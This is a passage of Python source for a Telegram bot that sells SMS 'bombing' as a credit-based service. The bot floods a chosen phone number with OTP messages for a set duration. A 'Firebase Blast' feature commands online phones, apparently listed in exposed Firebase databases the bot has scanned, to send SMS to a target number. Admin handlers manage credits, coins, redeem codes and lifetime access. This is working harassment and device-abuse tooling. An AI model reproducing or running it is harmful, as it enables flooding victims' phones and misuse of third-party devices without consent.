        log.exception("duration cb")
    finally:
        await c.answer()


async def _launch_bomber(msg, uid, target, duration_min, cost):
    try:
        u = get_user(uid)
        now = int(time.time())
        if not is_admin(uid):
            cooldown = setting("cooldown", int)
            if now - u["last_bomb"] < cooldown:
                return await msg.answer(
                    f"⏳ wait {cooldown - (now - u['last_bomb'])}s")
        if is_blacklisted(target):
            return await msg.answer(f"🚫 <code>{target}</code> blocked")
        _exec("UPDATE users SET last_bomb=?, total_bombs=total_bombs+1 "
              "WHERE user_id=?", (now, uid))
        log_action(uid, "bomb_start",
                   f"{target} {duration_min}m cost={cost}")
        stop_ev = asyncio.Event()
        BOMB_STOPS[uid] = stop_ev
        duration_sec = duration_min * 60
        text = (
            f"🚀 <b>BOMBING</b>\n\n"
            f"🎯 <code>{target}</code>\n"
            f"⏱ <b>{duration_min}</b> min\n"
            f"💳 cost <b>{cost}</b>\n"
            f"⚡ firing..."
        )
        stop_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🛑 STOP", callback_data="b:stop")]
        ])
        status = await msg.edit_text(text, reply_markup=stop_kb)
        asyncio.create_task(_run_and_report(status, uid, target,
                                             duration_sec, duration_min,
                                             stop_ev))
    except Exception:
        log.exception("launch bomber")


@dp.callback_query(F.data == "b:stop")
async def cb_stop_bomb(c: types.CallbackQuery):
    try:
        ev = BOMB_STOPS.get(c.from_user.id)
        if ev:
            ev.set()
            await c.answer("🛑 Stopping...")
        else:
            await c.answer("Nothing to stop.", show_alert=True)
    except Exception:
        log.exception("stop bomb")


async def _run_and_report(status_msg, uid, target, duration_sec,
                           duration_min, stop_ev):
    async def progress(ok, fail, remaining):
        mm, ss = divmod(max(0, remaining), 60)
        try:
            await status_msg.edit_text(
                f"🚀 <b>BOMBING</b>\n\n"
                f"🎯 <code>{target}</code>\n"
                f"⏳ <b>{mm}m {ss}s</b>\n"
                f"📨 <b>{ok}</b>  ❌ {fail}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🛑 STOP",
                                          callback_data="b:stop")]
                ]))
        except Exception:
            pass
    try:
        ok, fail, err = await run_bomber(target, duration_sec, stop_ev,
                                          progress_cb=progress)
        total = ok + fail
        _exec("UPDATE users SET total_sent=total_sent+? WHERE user_id=?",
              (ok, uid))
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,"
              "category,ts) VALUES(?,?,?,?,?,?,?,?)",
              (uid, target, total, "OTP", ok, fail, "all",
               int(time.time())))
        u = get_user(uid)
        text = (
            f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} <b>Done</b>\n\n"
            f"🎯 <code>{target}</code>\n"
            f"⏱ <b>{duration_min}m</b>\n"
            f"📨 <b>{ok}</b>  ❌ <b>{fail}</b>\n"
            f"💳 <b>{u['credits']}</b>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💣 Again", callback_data="b:start"),
             InlineKeyboardButton(text="🏠 Menu",  callback_data="m:home")]
        ])
        try:
            await status_msg.edit_text(text, reply_markup=kb)
        except Exception:
            pass
    except Exception as e:
        log.exception("bomb crashed")
        try:
            await status_msg.edit_text(
                f"⚠️ crashed: <code>{str(e)[:100]}</code>",
                reply_markup=back_kb())
        except Exception:
            pass
    finally:
        BOMB_STOPS.pop(uid, None)


# ─────────────────────────────────────────────────────────────
# FIREBASE — USER
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "f:home")
async def cb_fb_home(c: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        u = get_user(c.from_user.id)
        coin_cost = setting("coin_cost", int)
        total = _exec("SELECT COUNT(*) c FROM firebase_targets",
                      fetch="one")["c"]
        scanned = _exec("SELECT COUNT(*) c FROM firebase_targets "
                        "WHERE reachable=1", fetch="one")["c"]
        online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                       "FROM firebase_targets", fetch="one")["s"]
        devices = _exec("SELECT COALESCE(SUM(device_count),0) s "
                        "FROM firebase_targets", fetch="one")["s"]
        admin = is_admin(c.from_user.id)
        await c.message.edit_text(
            f"🔥 <b>FIREBASE BLAST</b>\n\n"
            f"🪙 Coins: <b>{u['coins']}</b>"
            f"{'  (∞ admin)' if admin else ''}\n"
            f"💵 Cost: <b>{coin_cost} coin</b> per fire\n\n"
            f"📡 Targets: <b>{total}</b> · ✅ scanned <b>{scanned}</b>\n"
            f"🟢 Online: <b>{online}</b> · 📱 Total: <b>{devices}</b>",
            reply_markup=fb_user_kb())
    except Exception:
        log.exception("fb home")
    finally:
        await c.answer()


@dp.callback_query(F.data == "f:status")
async def cb_fb_user_status(c: types.CallbackQuery):
    try:
        rows = _exec("SELECT * FROM firebase_targets "
                     "WHERE online_count > 0 OR reachable=1 "
                     "ORDER BY online_count DESC LIMIT 20", fetch="all")
        lines = []
        for r in rows:
            mark = "✅" if r["reachable"] else "❌"
            lines.append(
                f"{mark} #{r['id']} 🟢{r['online_count']}/{r['total_count']} "
                f"<code>{r['name'][:28]}</code>")
        await c.message.edit_text(
            "📊 <b>Firebase Status</b>\n\n" +
            ("\n".join(lines) or "no targets"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📱 Devices",
                                      callback_data="f:devs:0")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="f:home")]]))
    except Exception:
        log.exception("fb status")
    finally:
        await c.answer()


@dp.callback_query(F.data == "f:send_start")
async def cb_fb_send_start(c: types.CallbackQuery, state: FSMContext):
    try:
        u = get_user(c.from_user.id)
        admin = is_admin(c.from_user.id)
        coin_cost = setting("coin_cost", int)
        if not admin and u["coins"] < coin_cost:
            return await c.answer(
                f"❌ Need {coin_cost} coin. You have {u['coins']}.",
                show_alert=True)
        scanned = _exec("SELECT COUNT(*) c FROM firebase_targets "
                        "WHERE reachable=1", fetch="one")["c"]
        if scanned == 0:
            return await c.answer(
                "❌ No scanned firebase. Ask admin to scan.",
                show_alert=True)
        await state.set_state(UserFSM.fb_target_number)
        await c.message.edit_text(
            "📨 <b>Firebase Blast</b>\n\n"
            "Step 1/2: send target phone number.\n\n"
            "Send <code>-</code> to cancel.",
            reply_markup=cancel_kb())
    except Exception:
        log.exception("fb send start")
    finally:
        await c.answer()


@dp.message(UserFSM.fb_target_number, F.text)
async def fsm_fb_target_number(m: types.Message, state: FSMContext):
    try:
        txt = (m.text or "").strip()
        if txt == "-":
            await state.clear()
            u = get_user(m.from_user.id)
            return await m.answer(
                "❌ Cancelled.",
                reply_markup=main_menu_kb(is_admin(m.from_user.id),
                                          bool(u["lifetime"])))
        digits = "".join(c for c in txt if c.isdigit())
        if len(digits) < 10:
            return await m.answer("❌ Invalid number.",
                                  reply_markup=cancel_kb())
        number = digits[-10:]
        await state.update_data(target_number=number)
        await state.set_state(UserFSM.fb_message)
        await m.answer(
            f"🎯 <code>{number}</code>\n\nStep 2/2: send the message body.",
            reply_markup=cancel_kb())
    except Exception:
        log.exception("fsm num")


@dp.message(UserFSM.fb_message, F.text)
async def fsm_fb_message(m: types.Message, state: FSMContext):
    try:
        txt = (m.text or "").strip()
        if txt == "-":
            await state.clear()
            u = get_user(m.from_user.id)
            return await m.answer(
                "❌ Cancelled.",
                reply_markup=main_menu_kb(is_admin(m.from_user.id),
                                          bool(u["lifetime"])))
        message = txt[:300]
        data = await state.get_data()
        number = data.get("target_number")
        await state.clear()
        if not number:
            return await m.answer("Session expired.")
        u = get_user(m.from_user.id)
        admin = is_admin(m.from_user.id)
        coin_cost = setting("coin_cost", int)
        if not admin and not take_coins(m.from_user.id, coin_cost):
            return await m.answer(f"❌ Need {coin_cost} coin.")
        stop_ev = asyncio.Event()
        FB_SEND_STOPS[m.from_user.id] = stop_ev
        status = await m.answer(
            f"🔥 <b>Blasting...</b>\n\n"
            f"🎯 <code>{number}</code>\n"
            f"📨 <code>{message[:60]}</code>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🛑 Stop", callback_data="f:stop")]
            ]))
        asyncio.create_task(_run_fb_blast(status, m.from_user.id, number,
                                           message, coin_cost, stop_ev))
    except Exception:
        log.exception("fsm msg")


@dp.callback_query(F.data == "f:stop")
async def cb_fb_stop(c: types.CallbackQuery):
    try:
        ev = FB_SEND_STOPS.get(c.from_user.id)
        if ev:
            ev.set()
            await c.answer("🛑 Stopping...")
        else:
            await c.answer("Nothing running.", show_alert=True)
    except Exception:
        log.exception("fb stop")


async def _run_fb_blast(status_msg, uid, number, message, cost, stop_ev):
    try:
        rows = _exec("SELECT * FROM firebase_targets WHERE reachable=1",
                     fetch="all")
        total_sent = 0
        total_devices = 0
        fb_done = 0

        connector = aiohttp.TCPConnector(ssl=False, limit=100,
                                         limit_per_host=30)
        session = aiohttp.ClientSession(connector=connector)

        try:
            for t in rows:
                if stop_ev.is_set():
                    break
                try:
                    devs, err = await fb_fetch_clients(session, t["url"],
                                                        max_devices=400)
                except Exception as e:
                    log.warning("clients fail %s: %s", t["url"], e)
                    devs, err = [], str(e)[:80]
                if err:
                    continue

                online = [d for d in devs if d["is_online"]]
                fb_done += 1
                total_devices += len(online)

                sent_fb = [0]
                sem = asyncio.Semaphore(30)

                async def fire_one(dv):
                    if stop_ev.is_set():
                        return
                    slots = dv["sims"] or [0]
                    slot = slots[0] if slots else 0
                    async with sem:
                        ok = await fb_send_sms(session, t["url"],
                                                dv["dev_id"], slot,
                                                number, message)
                    if ok:
                        sent_fb[0] += 1

                await asyncio.gather(*(fire_one(d) for d in online),
                                     return_exceptions=True)
                total_sent += sent_fb[0]

                try:
                    await status_msg.edit_text(
                        f"🔥 <b>Blasting...</b>\n\n"
                        f"🎯 <code>{number}</code>\n"
                        f"📡 Firebase: <b>{fb_done}/{len(rows)}</b>\n"
                        f"📱 Devices hit: <b>{total_devices}</b>\n"
                        f"📨 Sent: <b>{total_sent}</b>",
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="🛑 Stop",
                                                  callback_data="f:stop")]
                        ]))
                except Exception:
                    pass
        finally:
            try:
                await session.close()
            except Exception:
                pass

        _exec("UPDATE users SET total_pushes=total_pushes+1 WHERE user_id=?",
              (uid,))
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,"
              "category,ts) VALUES(?,?,?,?,?,?,?,?)",
              (uid, number, total_devices, message, total_sent,
               max(0, total_devices - total_sent), "firebase_blast",
               int(time.time())))
        u = get_user(uid)
        try:
            await status_msg.edit_text(
                f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} <b>Done</b>\n\n"
                f"🎯 <code>{number}</code>\n"
                f"📡 Firebase scanned: <b>{fb_done}/{len(rows)}</b>\n"
                f"📱 Devices hit: <b>{total_devices}</b>\n"
                f"📨 SMS queued: <b>{total_sent}</b>\n"
                f"🪙 Coins: <b>{u['coins']}</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🔥 Again",
                                          callback_data="f:send_start"),
                     InlineKeyboardButton(text="🏠 Menu",
                                          callback_data="m:home")]
                ]))
        except Exception:
            pass
    except Exception:
        log.exception("fb blast crash")
    finally:
        FB_SEND_STOPS.pop(uid, None)


# ─────────────────────────────────────────────────────────────
# DEVICE VIEWER
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("f:devs:"))
async def cb_fb_devs(c: types.CallbackQuery):
    try:
        page = int(c.data.split(":")[2])
        kb, page, max_p, total = fb_devices_kb(page)
        await c.message.edit_text(
            f"📱 <b>Firebase Targets</b>\n"
            f"Page {page+1}/{max_p+1} · {total} total\n\n"
            f"Tap a firebase to see its devices.",
            reply_markup=kb)
    except Exception:
        log.exception("devs cb")
    finally:
        await c.answer()


@dp.callback_query(F.data.startswith("f:devlist:"))
async def cb_fb_devlist(c: types.CallbackQuery):
    try:
        parts = c.data.split(":")
        fid = int(parts[2])
        page = int(parts[3]) if len(parts) > 3 else 0
        t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
                  fetch="one")
        if not t:
            return await c.answer("Not found.", show_alert=True)
        rows = _exec(
            "SELECT * FROM firebase_devices WHERE firebase_id=? "
            "ORDER BY id DESC LIMIT 100", (fid,), fetch="all")
        if not rows:
            return await c.message.edit_text(
                f"📱 <b>{t['name'][:40]}</b>\n\nNo devices scanned yet.\n\n"
                f"Admin must run Scan first.",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="⬅️ Back",
                                          callback_data="f:devs:0")]]))
        online_lines = []
        offline_lines = []
        for d in rows:
            try:
                obj = json.loads(d["info"]) if d["info"] else {}
            except Exception:
                obj = {}
            label = obj.get("name") or d["device_key"][:16]
            sims = obj.get("sims") or [0]
            if obj.get("online"):
                online_lines.append(
                    f"🟢 <code>{d['device_key'][:14]}</code> · "
                    f"{label[:20]} · SIMs {len(sims)}")
            else:
                offline_lines.append(
                    f"⚫ <code>{d['device_key'][:14]}</code> · "
                    f"{label[:20]}")
        text = (f"📱 <b>{t['name'][:40]}</b>\n"
                f"🟢 {t['online_count']}/{t['total_count']} online\n\n"
                f"<b>Online ({len(online_lines)}):</b>\n" +
                ("\n".join(online_lines[:30]) or "none"))
        if offline_lines:
            text += (f"\n\n<b>Offline ({len(offline_lines)}):</b>\n" +
                     "\n".join(offline_lines[:10]))
        if len(text) > 3800:
            text = text[:3800] + "\n…"
        await c.message.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="f:devs:0")]]))
    except Exception:
        log.exception("devlist")
    finally:
        await c.answer()


# ─────────────────────────────────────────────────────────────
# TEST SLOTS
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "f:slots")
async def cb_fb_slots(c: types.CallbackQuery):
    try:
        await c.message.edit_text(
            "🎯 <b>Test IDs</b>\n\nAdmins assign, anyone can fire.",
            reply_markup=fb_slots_user_kb())
    except Exception:
        log.exception("slots")
    finally:
        await c.answer()


@dp.callback_query(F.data.startswith("f:slot_view:"))
async def cb_fb_slot_view(c: types.CallbackQuery, state: FSMContext):
    try:
        slot = int(c.data.split(":")[2])
        row = fb_test_slot_get(slot)
        if not row:
            return await c.answer("Slot not set by admin.", show_alert=True)
        t = _exec("SELECT * FROM firebase_targets WHERE id=?",
                  (row["firebase_id"],), fetch="one")
        name = t["name"] if t else f"#{row['firebase_id']}"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📨 Fire from this device",
                                  callback_data=f"f:slot_use:{slot}")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="f:slots")],
        ])
        await c.message.edit_text(
            f"🎯 <b>Test ID {slot}</b>\n\n"
            f"Firebase: <code>{name[:40]}</code>\n"
            f"Device: <code>{row['device_key'][:40]}</code>",
            reply_markup=kb)
    except Exception:
        log.exception("slot view")
    finally:
        await c.answer()


@dp.callback_query(F.data.startswith("f:slot_use:"))
async def cb_fb_slot_use(c: types.CallbackQuery, state: FSMContext):
    try:
        slot = int(c.data.split(":")[2])
        row = fb_test_slot_get(slot)
        if not row:
            return await c.answer("Slot not set.", show_alert=True)
        u = get_user(c.from_user.id)
        admin = is_admin(c.from_user.id)
        coin_cost = setting("coin_cost", int)
        if not admin and u["coins"] < coin_cost:
            return await c.answer(
                f"❌ Need {coin_cost} coin.", show_alert=True)
        await state.update_data(slot=slot)
        await state.set_state(AdminFSM.fb_slot_fire_num)
        await c.message.edit_text(
            f"🎯 Test ID {slot}\n\nSend target phone number.",
            reply_markup=cancel_kb())
    except Exception:
        log.exception("slot use")
    finally:
        await c.answer()


@dp.message(AdminFSM.fb_slot_fire_num, F.text)
async def fsm_fb_slot_fire_num(m: types.Message, state: FSMContext):
    try:
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        digits = "".join(c for c in txt if c.isdigit())
        if len(digits) < 10:
            return await m.answer("Invalid number.")
        await state.update_data(number=digits[-10:])
        await state.set_state(AdminFSM.fb_slot_fire_msg)
        await m.answer("Now send the message body.")
    except Exception:
        log.exception("slot num")


@dp.message(AdminFSM.fb_slot_fire_msg, F.text)
async def fsm_fb_slot_fire_msg(m: types.Message, state: FSMContext):
    try:
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        d = await state.get_data()
        slot = d.get("slot")
        number = d.get("number")
        await state.clear()
        if not number:
            return await m.answer("Session expired.")
        status = await m.answer(
            f"📨 Firing to <code>{number}</code>...")
        ok, info = await fb_test_fire(slot, number, txt[:200])
        log_action(m.from_user.id, "slot_fire",
                   f"slot={slot} num={number} ok={ok}")
        if ok:
            await status.edit_text(
                f"✅ Delivered\n\n🎯 <code>{number}</code>\n"
                f"📨 <code>{txt[:60]}</code>\n📡 {info}",
                reply_markup=admin_back_kb())
        else:
            await status.edit_text(
                f"❌ Failed\n\nReason: {info}",
                reply_markup=admin_back_kb())
    except Exception:
        log.exception("slot fire msg")


# ─────────────────────────────────────────────────────────────
# REDEEM
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "m:redeem")
async def cb_redeem_start(c: types.CallbackQuery, state: FSMContext):
    try:
        await state.set_state(UserFSM.redeem_code)
        await c.message.edit_text(
            "🎁 <b>Redeem</b>\n\nSend code.",
            reply_markup=cancel_kb())
    except Exception:
        log.exception("redeem start")
    finally:
        await c.answer()


@dp.message(UserFSM.redeem_code, F.text)
async def fsm_redeem(m: types.Message, state: FSMContext):
    try:
        code = (m.text or "").strip().upper()
        await state.clear()
        row = _exec("SELECT * FROM redeem_codes WHERE code=? AND active=1",
                    (code,), fetch="one")
        u = get_user(m.from_user.id)
        admin = is_admin(m.from_user.id)
        km = main_menu_kb(admin, bool(u["lifetime"]) or admin)
        if not row:
            return await m.answer("❌ Invalid code.", reply_markup=km)
        if row["used"] >= row["max_uses"]:
            return await m.answer("❌ Exhausted.", reply_markup=km)
        if _exec("SELECT 1 FROM redeem_uses WHERE code=? AND user_id=?",
                 (code, m.from_user.id), fetch="one"):
            return await m.answer("❌ Already used.", reply_markup=km)
        currency = row["currency"] or "credits"
        if currency == "coins":
            add_coins(m.from_user.id, row["amount"])
        else:
            add_credits(m.from_user.id, row["amount"])
        _exec("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
        _exec("INSERT INTO redeem_uses(code,user_id,used_at) VALUES(?,?,?)",
              (code, m.from_user.id, int(time.time())))
        log_action(m.from_user.id, "redeem",
                   f"{code} +{row['amount']} {currency}")
        await m.answer(f"✅ +{row['amount']} {currency}", reply_markup=km)
    except Exception:
        log.exception("redeem")


# ─────────────────────────────────────────────────────────────
# ADMIN PANEL
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "a:home")
async def cb_admin_home(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.clear()
        await c.message.edit_text(
            "🛠 <b>Admin Panel</b>\n\nPick a section.",
            reply_markup=admin_kb())
    except Exception:
        log.exception("admin home")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:stats")
async def cb_stats(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
        banned = _exec("SELECT COUNT(*) c FROM users WHERE banned=1",
                       fetch="one")["c"]
        lifetime = _exec("SELECT COUNT(*) c FROM users WHERE lifetime=1",
                         fetch="one")["c"]
        credits = _exec("SELECT COALESCE(SUM(credits),0) s FROM users",
                        fetch="one")["s"]
        coins = _exec("SELECT COALESCE(SUM(coins),0) s FROM users",
                      fetch="one")["s"]
        bombs = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users",
                      fetch="one")["s"]
        sent = _exec("SELECT COALESCE(SUM(total_sent),0) s FROM users",
                     fetch="one")["s"]
        pushes = _exec("SELECT COALESCE(SUM(total_pushes),0) s FROM users",
                       fetch="one")["s"]
        apis_active = _exec("SELECT COUNT(*) c FROM apis WHERE active=1",
                            fetch="one")["c"]
        apis_total = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
        fb_total = _exec("SELECT COUNT(*) c FROM firebase_targets",
                         fetch="one")["c"]
        fb_reach = _exec("SELECT COUNT(*) c FROM firebase_targets "
                         "WHERE reachable=1", fetch="one")["c"]
        fb_online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                          "FROM firebase_targets", fetch="one")["s"]
        fb_devices = _exec("SELECT COALESCE(SUM(device_count),0) s "
                           "FROM firebase_targets", fetch="one")["s"]
        up = int(time.time()) - START_TIME
        h, rem = divmod(up, 3600)
        mm = rem // 60
        await c.message.edit_text(
            f"📊 <b>Stats</b>\n\n"
            f"⏱ Uptime: <b>{h}h {mm}m</b>\n"
            f"👥 Users: <b>{total}</b> · 🚫 <b>{banned}</b> · ⭐ <b>{lifetime}</b>\n"
            f"💳 Credits: <b>{credits}</b>\n"
            f"🪙 Coins: <b>{coins}</b>\n"
            f"💥 Bombs: <b>{bombs}</b>\n"
            f"📨 Sent: <b>{sent}</b>\n"
            f"🔥 Firebase: <b>{pushes}</b>\n\n"
            f"🔌 APIs: <b>{apis_active}/{apis_total}</b>\n"
            f"🔥 Firebase: <b>{fb_reach}/{fb_total}</b> reachable\n"
            f"🟢 Online: <b>{fb_online}</b> · 📱 Devices: <b>{fb_devices}</b>",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("stats")
    finally:
        await c.answer()


@dp.callback_query(F.data.startswith("a:users:"))
async def cb_users(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        page = int(c.data.split(":")[2])
        per = 10
        total = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
        max_p = max(0, (total - 1) // per)
        page = min(page, max_p)
        rows = _exec("SELECT * FROM users ORDER BY created_at DESC "
                     "LIMIT ? OFFSET ?", (per, page * per), fetch="all")
        lines = [
            f"{'🚫' if r['banned'] else '✅'}{'⭐' if r['lifetime'] else ''} "
            f"<code>{r['user_id']}</code> @{r['username'] or '-'} "
            f"💳{r['credits']} 🪙{r['coins']}"
            for r in rows
        ]
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton(
                text="⬅️", callback_data=f"a:users:{page-1}"))
        if page < max_p:
            nav.append(InlineKeyboardButton(
                text="➡️", callback_data=f"a:users:{page+1}"))
        kb = ([nav] if nav else []) + \
             [[InlineKeyboardButton(text="⬅️ Back",
                                    callback_data="a:home")]]
        await c.message.edit_text(
            f"👥 <b>Users</b> {page+1}/{max_p+1} · total {total}\n\n" +
            ("\n".join(lines) or "empty"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except Exception:
        log.exception("users")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:add")
async def cb_add(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.add_credits_uid)
        await state.update_data(mode="add_credits")
        await c.message.edit_text(
            "➕ <b>Add Credits</b>\n\nSend user ID.",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("add start")
    finally:
        await c.answer()


@dp.callback_query(F.data == "a:ded")
async def cb_ded(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.add_credits_uid)
        await state.update_data(mode="ded_credits")
        await c.message.edit_text(
            "➖ <b>Remove Credits</b>\n\nSend user ID.",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("ded start")
    finally:
        await c.answer()


@dp.message(AdminFSM.add_credits_uid, F.text)
async def fsm_add_uid(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric ID required.")
        uid = int(txt)
        u = get_user(uid)
        if not u:
            return await m.answer("User not found.")
        await state.update_data(uid=uid)
        await state.set_state(AdminFSM.add_credits_amt)
        mode = (await state.get_data()).get("mode", "add_credits")
        verb = "remove" if mode == "ded_credits" else "add"
        await m.answer(
            f"How many credits to {verb}?\n"
            f"User <code>{uid}</code> has <b>{u['credits']}</b>.")
    except Exception:
        log.exception("fsm add uid")


@dp.message(AdminFSM.add_credits_amt, F.text)
async def fsm_add_amt(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        try:
            amt = int(txt)
        except ValueError:
            return await m.answer("Numeric value required.")
        d = await state.get_data()
        uid = d.get("uid")
        mode = d.get("mode", "add_credits")
        if not uid or not get_user(uid):
            await state.clear()
            return await m.answer("User not found.")
        if mode == "ded_credits":
            cur = get_user(uid)["credits"]
            new_val = max(0, cur - amt)
            _exec("UPDATE users SET credits=? WHERE user_id=?",
                  (new_val, uid))
            log_action(m.from_user.id, "admin_ded_credits",
                       f"to={uid} amt={amt}")
            await state.clear()
            await m.answer(
                f"✅ -{amt} credits from <code>{uid}</code>\n"
                f"New: <b>{new_val}</b>",
                reply_markup=admin_kb())
        else:
            add_credits(uid, amt)
            log_action(m.from_user.id, "admin_add_credits",
                       f"to={uid} amt={amt}")
            await state.clear()
            await m.answer(
                f"✅ +{amt} credits to <code>{uid}</code>\n"
                f"New: <b>{get_user(uid)['credits']}</b>",
                reply_markup=admin_kb())
    except Exception:
        log.exception("fsm add amt")


@dp.callback_query(F.data == "a:add_coins")
async def cb_add_coins(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.add_coins_uid)
        await c.message.edit_text(
            "🪙 <b>Add Coins</b>\n\nSend user ID.",
            reply_markup=admin_back_kb())
    except Exception:
        log.exception("add coins start")
    finally:
        await c.answer()


@dp.message(AdminFSM.add_coins_uid, F.text)
async def fsm_add_coins_uid(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric ID.")
        uid = int(txt)
        u = get_user(uid)
        if not u:
            return await m.answer("Not found.")
        await state.update_data(uid=uid)
        await state.set_state(AdminFSM.add_coins_amt)
        await m.answer(
            f"How many coins?\n<code>{uid}</code> has <b>{u['coins']}</b>.")
    except Exception:
        log.exception("fsm coins uid")


@dp.message(AdminFSM.add_coins_amt, F.text)
async def fsm_add_coins_amt(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        try:
            amt = int(txt)
        except ValueError:
            return await m.answer("Numeric.")
        d = await state.get_data()
        uid = d.get("uid")
        if not uid or not get_user(uid):
            await state.clear()
            return await m.answer("Not found.")
        add_coins(uid, amt)
        log_action(m.from_user.id, "admin_add_coins",
                   f"to={uid} amt={amt}")
        await state.clear()
        await m.answer(
            f"✅ +{amt} coins to <code>{uid}</code>\n"
            f"New: <b>{get_user(uid)['coins']}</b>",
            reply_markup=admin_kb())
    except Exception:
        log.exception("fsm coins amt")


@dp.callback_query(F.data == "a:lt_grant")
async def cb_lt_grant(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.grant_lt_uid)
        await c.message.edit_text("⭐ Send user ID.",
                                  reply_markup=admin_back_kb())
    except Exception:
        log.exception("grant prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.grant_lt_uid, F.text)
async def fsm_lt_grant(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric.")
        uid = int(txt)
        if not get_user(uid):
            return await m.answer("Not found.")
        _exec("UPDATE users SET lifetime=1 WHERE user_id=?", (uid,))
        log_action(m.from_user.id, "admin_grant_lt", str(uid))
        await state.clear()
        await m.answer(f"⭐ Lifetime to <code>{uid}</code>",
                       reply_markup=admin_kb())
    except Exception:
        log.exception("grant")


@dp.callback_query(F.data == "a:lt_revoke")
async def cb_lt_revoke(c: types.CallbackQuery, state: FSMContext):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        await state.set_state(AdminFSM.revoke_lt_uid)
        await c.message.edit_text("🚫 Send user ID.",
                                  reply_markup=admin_back_kb())
    except Exception:
        log.exception("revoke prompt")
    finally:
        await c.answer()


@dp.message(AdminFSM.revoke_lt_uid, F.text)
async def fsm_lt_revoke(m: types.Message, state: FSMContext):
    try:
        if not is_admin(m.from_user.id):
            return await state.clear()
        txt = (m.text or "").strip()
        if txt.startswith("/"):
            return await state.clear()
        if not txt.isdigit():
            return await m.answer("Numeric.")
        uid = int(txt)
        _exec("UPDATE users SET lifetime=0 WHERE user_id=?", (uid,))
        log_action(m.from_user.id, "admin_revoke_lt", str(uid))
        await state.clear()
        await m.answer(f"🚫 Revoked for <code>{uid}</code>",
                       reply_markup=admin_kb())
    except Exception:
        log.exception("revoke")


@dp.callback_query(F.data == "a:lt_list")
async def cb_lt_list(c: types.CallbackQuery):
    try:
        if not is_admin(c.from_user.id):
            return await c.answer("no", show_alert=True)
        rows = _exec("SELECT user_id, username, credits FROM users "
                     "WHERE lifetime=1 ORDER BY created_at DESC", fetch="all")
        lines = [f"⭐ <code>{r['user_id']}</code> @{r['username'] or '-'} "
                 f"💳{r['credits']}" for r in rows]
        await c.message.edit_text(
